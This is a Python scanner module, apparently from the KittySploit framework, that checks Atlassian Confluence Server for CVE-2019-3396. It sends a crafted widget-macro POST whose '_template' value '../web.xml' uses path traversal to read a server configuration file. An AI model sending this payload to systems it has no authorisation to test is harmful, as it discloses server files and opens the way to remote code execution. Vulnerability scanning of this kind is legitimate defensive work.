#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Widget Connector macro in Atlassian Confluence Server before version 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Atlassian Confluence Server - Path Traversal Detection',
        'description': 'The Widget Connector macro in Atlassian Confluence Server before version 6.6.12 (the fixed version for 6.6.x), from version 6.7.0 before 6.12.3 (the fixed version for 6.12.x), from version 6.13.0 before 6.13.3 (the fixed version for 6.13.x), and from version 6.14.0 before 6.14.2 (the fixed version for 6.14.x), allows remote attackers to achieve path traversal and remote code execution on a Confluence Server or Data Center instance via server-side template injection.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'atlassian', 'confluence', 'lfi', 'rce', 'kev', 'packetstorm', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/x-f1v3/CVE-2019-3396',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-3396',
            'https://jira.atlassian.com/browse/CONFSERVER-57974',
            'http://packetstormsecurity.com/files/152568/Atlassian-Confluence-Widget-Connector-Macro-Velocity-Template-Injection.html',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2019-3396',
    }

    def run(self):
        path = '/rest/tinymce/1/macro/preview'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Referer': '{{Hostname}}'}, data='{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<param-name>contextConfigLocation</param-name>',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='Atlassian Confluence Server - Path Traversal detected', path=path)
            return True
        return False

